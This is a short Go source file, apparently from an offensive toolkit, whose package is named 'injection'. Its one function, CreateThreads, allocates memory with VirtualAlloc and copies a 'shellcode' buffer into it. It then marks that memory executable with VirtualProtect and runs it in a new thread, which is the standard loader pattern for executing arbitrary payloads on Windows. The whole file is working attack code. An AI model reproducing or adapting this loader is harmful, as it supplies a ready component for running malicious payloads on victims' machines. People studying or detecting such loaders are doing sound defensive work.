package injection

import (
	"unsafe"

	"golang.org/x/sys/windows"
)

func CreateThreads() {
	addr, _ := windows.VirtualAlloc(uintptr(0), uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)

	RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	oldProtect := PAGE_READWRITE
	VirtualProtect.Call(addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))

	thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)

	windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
}
